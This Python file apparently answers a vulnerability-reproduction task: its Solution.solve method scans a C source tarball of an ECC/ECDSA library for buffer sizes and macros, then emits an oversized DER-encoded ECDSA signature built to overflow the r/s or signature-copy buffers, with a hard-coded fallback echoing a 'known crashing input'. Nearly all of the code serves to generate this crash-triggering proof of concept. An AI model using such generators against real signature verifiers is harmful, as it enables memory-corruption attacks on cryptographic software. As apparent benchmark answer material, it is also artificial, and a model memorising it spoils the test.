import os
import re
import tarfile
import ast
from typing import Dict, Optional, List, Tuple


def _strip_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    s = re.sub(r"//.*?$", "", s, flags=re.M)
    return s


_CAST_TYPES = [
    "unsigned char", "signed char", "char",
    "unsigned short", "short",
    "unsigned int", "int",
    "unsigned long", "long",
    "unsigned long long", "long long",
    "size_t",
    "uint8_t", "uint16_t", "uint32_t", "uint64_t",
    "int8_t", "int16_t", "int32_t", "int64_t",
    "word16", "word32", "word64",
    "byte",
]


def _remove_simple_casts(expr: str) -> str:
    # Remove common casts like (int), (word32), (unsigned int) to help evaluation.
    for t in sorted(_CAST_TYPES, key=len, reverse=True):
        expr = re.sub(r"\(\s*" + re.escape(t) + r"\s*\)", "", expr)
    return expr


def _normalize_c_int_literals(expr: str) -> str:
    # Remove common suffixes like U, UL, ULL, L.
    expr = re.sub(r"\b(0x[0-9A-Fa-f]+|\d+)\s*([uUlL]{1,3})\b", r"\1", expr)
    return expr


_ALLOWED_BINOPS = {
    ast.Add: lambda a, b: a + b,
    ast.Sub: lambda a, b: a - b,
    ast.Mult: lambda a, b: a * b,
    ast.FloorDiv: lambda a, b: a // b,
    ast.Mod: lambda a, b: a % b,
    ast.LShift: lambda a, b: a << b,
    ast.RShift: lambda a, b: a >> b,
    ast.BitOr: lambda a, b: a | b,
    ast.BitAnd: lambda a, b: a & b,
    ast.BitXor: lambda a, b: a ^ b,
}
_ALLOWED_UNOPS = {
    ast.UAdd: lambda a: +a,
    ast.USub: lambda a: -a,
    ast.Invert: lambda a: ~a,
}


def _safe_eval_int_expr(expr: str, macros: Dict[str, int]) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None
    expr = _strip_c_comments(expr)
    expr = _remove_simple_casts(expr)
    expr = _normalize_c_int_literals(expr)
    expr = expr.strip()

    # Some array sizes include commas (e.g., [N, ...]) in macros; reject.
    if "," in expr or "?" in expr or ":" in expr:
        return None
    # Reject obvious non-constant constructs.
    if "sizeof" in expr or "alignof" in expr or "offsetof" in expr:
        return None
    # Disallow braces.
    if "{" in expr or "}" in expr:
        return None

    # Fast path for plain numbers.
    m = re.fullmatch(r"\(?\s*(0x[0-9A-Fa-f]+|\d+)\s*\)?", expr)
    if m:
        try:
            return int(m.group(1), 0)
        except Exception:
            return None

    # Replace known macro tokens with names left for AST Name handling.
    # Ensure expr only contains safe characters.
    if not re.fullmatch(r"[A-Za-z0-9_\s\(\)\+\-\*\/%<>&\|\^~]+", expr):
        return None
    expr = expr.replace("/", "//")  # C-style integer division
    try:
        node = ast.parse(expr, mode="eval")
    except Exception:
        return None

    def eval_node(n) -> int:
        if isinstance(n, ast.Expression):
            return eval_node(n.body)
        if isinstance(n, ast.Constant):
            if isinstance(n.value, int):
                return int(n.value)
            raise ValueError
        if isinstance(n, ast.Num):  # pragma: no cover
            return int(n.n)
        if isinstance(n, ast.Name):
            if n.id in macros:
                return int(macros[n.id])
            raise ValueError
        if isinstance(n, ast.UnaryOp):
            op_type = type(n.op)
            if op_type in _ALLOWED_UNOPS:
                return _ALLOWED_UNOPS[op_type](eval_node(n.operand))
            raise ValueError
        if isinstance(n, ast.BinOp):
            op_type = type(n.op)
            if op_type in _ALLOWED_BINOPS:
                return _ALLOWED_BINOPS[op_type](eval_node(n.left), eval_node(n.right))
            raise ValueError
        if isinstance(n, ast.ParenExpr):  # pragma: no cover (py3.12+ doesn't have this)
            return eval_node(n.expression)
        raise ValueError

    try:
        v = eval_node(node)
    except Exception:
        return None
    if not isinstance(v, int):
        return None
    return v


def _encode_der_length(n: int) -> bytes:
    if n < 0:
        raise ValueError("negative length")
    if n < 0x80:
        return bytes([n])
    if n <= 0xFF:
        return bytes([0x81, n & 0xFF])
    if n <= 0xFFFF:
        return bytes([0x82, (n >> 8) & 0xFF, n & 0xFF])
    if n <= 0xFFFFFF:
        return bytes([0x83, (n >> 16) & 0xFF, (n >> 8) & 0xFF, n & 0xFF])
    return bytes([0x84, (n >> 24) & 0xFF, (n >> 16) & 0xFF, (n >> 8) & 0xFF, n & 0xFF])


def _build_ecdsa_sig_der(n: int) -> bytes:
    if n <= 0:
        n = 1
    r = b"\x01" * n
    s = b"\x02" * n
    int_r = b"\x02" + _encode_der_length(len(r)) + r
    int_s = b"\x02" + _encode_der_length(len(s)) + s
    content = int_r + int_s
    return b"\x30" + _encode_der_length(len(content)) + content


def _clamp_for_two_byte_der(n: int) -> int:
    # Keep total DER under 65535 where possible to avoid parser limitations.
    # Total size approx 12 + 2N for N>=256 (len fields use 0x82).
    if n < 1:
        return 1
    max_n = (65535 - 12) // 2
    if n > max_n:
        n = max_n
    return n


class Solution:
    def solve(self, src_path: str) -> bytes:
        macros: Dict[str, int] = {}
        relevant_files: List[Tuple[str, str]] = []

        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc")
        keyword_primary = ("ecdsa", "ecc")
        keyword_secondary = ("asn", "der", "sig")

        def parse_macros(text: str):
            for m in re.finditer(r"(?m)^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*$", text):
                name = m.group(1)
                val = m.group(2).strip()
                if not val:
                    continue
                # Drop continuation backslashes and trailing comments
                val = val.split("\\", 1)[0].strip()
                val = _strip_c_comments(val).strip()
                # Take first token-ish, but allow simple expressions by eval
                if len(val) > 128:
                    val = val[:128]
                v = _safe_eval_int_expr(val, macros)
                if v is None:
                    # Try first token only
                    tok = val.split()[0] if val.split() else ""
                    v = _safe_eval_int_expr(tok, macros)
                if v is None:
                    continue
                if 0 <= v <= 10_000_000:
                    macros.setdefault(name, v)

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for mem in tf.getmembers():
                    if not mem.isfile():
                        continue
                    name_l = mem.name.lower()
                    if not name_l.endswith(exts):
                        continue
                    if mem.size <= 0 or mem.size > 8_000_000:
                        continue
                    f = tf.extractfile(mem)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    except Exception:
                        continue
                    text = data.decode("utf-8", "ignore")
                    if not text:
                        continue
                    parse_macros(text)
                    tl = text.lower()
                    if any(k in tl for k in keyword_primary) and any(k in tl for k in keyword_secondary):
                        relevant_files.append((mem.name, text))
        except Exception:
            # If tar parsing fails, fall back to a strong default PoC
            n = _clamp_for_two_byte_der(20893)
            return _build_ecdsa_sig_der(n)

        # Collect candidate array declarations and memcpy destinations from relevant files
        array_sizes: Dict[str, int] = {}
        rs_sizes: List[int] = []
        sigbuf_sizes: List[int] = []
        memcpy_dest_sizes: List[Tuple[str, int]] = []

        decl_re = re.compile(
            r"\b(?:unsigned\s+char|char|uint8_t|uint16_t|uint32_t|uint64_t|byte|uchar)\s+([A-Za-z_]\w*)\s*\[\s*([^\]\n;]+?)\s*\]",
            re.M,
        )
        memcpy_re = re.compile(r"\b(?:memcpy|memmove|XMEMCPY|MEMCPY|wolfSSL_MemCpy)\s*\(\s*([A-Za-z_]\w*)\s*,")
        for _, text in relevant_files:
            t = _strip_c_comments(text)
            # Decls
            for m in decl_re.finditer(t):
                var = m.group(1)
                expr = m.group(2).strip()
                if not expr or len(expr) > 64:
                    continue
                size = _safe_eval_int_expr(expr, macros)
                if size is None:
                    continue
                if size <= 0 or size > 200_000:
                    continue
                # Keep the largest size seen for the var
                prev = array_sizes.get(var)
                if prev is None or size > prev:
                    array_sizes[var] = size

            # Memcpy dests
            for m in memcpy_re.finditer(t):
                dest = m.group(1)
                if dest in array_sizes:
                    memcpy_dest_sizes.append((dest, array_sizes[dest]))

        for var, sz in array_sizes.items():
            v = var.lower()
            if v in ("r", "s") or v.endswith("_r") or v.endswith("_s") or v.startswith("r_") or v.startswith("s_"):
                if 1 <= sz <= 65535:
                    rs_sizes.append(sz)
            if any(sub in v for sub in ("sig", "der", "asn", "buf", "tmp")) and sz >= 128:
                sigbuf_sizes.append(sz)

        # Also leverage macro if present
        for key in ("MAX_ECC_BYTES", "ECC_MAX_BYTES", "MAX_ECDSA_BYTES", "ECDSA_MAX_BYTES", "MAX_ECC_SIZE", "ECC_MAX_SIZE"):
            if key in macros and 1 <= macros[key] <= 65535:
                rs_sizes.append(macros[key])

        r_base = max(rs_sizes) if rs_sizes else 0

        # Prefer large stack buffers likely used for input signature copies
        memcpy_large = [sz for _, sz in memcpy_dest_sizes if 512 <= sz <= 65535]
        sig_named_large = [sz for sz in sigbuf_sizes if 512 <= sz <= 65535]
        sig_base = 0
        if memcpy_large:
            sig_base = max(memcpy_large)
        elif sig_named_large:
            sig_base = max(sig_named_large)

        if r_base > 0 and sig_base > 0:
            # Cover both: overflow r/s buffers and also exceed a potential signature copy buffer.
            n = max(r_base + 1, (sig_base // 2) + 256)
        elif r_base > 0:
            n = r_base + 1
        elif sig_base > 0:
            # Safer when we can't locate r/s sizes: exceed any potential integer-copy buffer too.
            n = sig_base + 1
        else:
            n = 20893  # fallback similar magnitude to known crashing input

        n = _clamp_for_two_byte_der(n)

        # Ensure we don't accidentally create too small input for parsers that short-circuit on tiny data.
        if n < 64:
            n = 64

        return _build_ecdsa_sig_der(n)